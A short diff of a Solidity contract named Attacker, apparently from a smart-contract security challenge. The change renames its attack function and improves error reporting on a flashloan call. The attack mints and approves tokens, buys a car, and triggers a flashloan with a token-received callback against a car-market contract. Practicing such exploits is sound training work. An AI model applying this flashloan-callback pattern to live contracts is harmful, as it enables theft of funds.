@@ -28,15 +28,17 @@ contract Attacker {
     /**
     * @notice Attack
     */
-    function Attack() external {
+    function attack() external {
         //mint & approve
         carToken.approve(address(carMarket), 100001 ether);
         carToken.mint();
         //purchase
         carMarket.purchaseCar("black", "Rolls Royce", "Phantom Drophead");
         //flashloan
-        (bool success, ) = address(carMarket).call(abi.encodeWithSignature("flashloan(uint256)", 100000 ether));
-        require(success, "Flashloan gone wrong");
+        (bool success, bytes memory data) = address(carMarket).call(abi.encodeWithSignature("flashloan(uint256)", 100000 ether));
+        //console.log();
+        string memory dataString = string(data);
+        require(success, dataString);
     }
 
     function receivedCarToken(address) external {
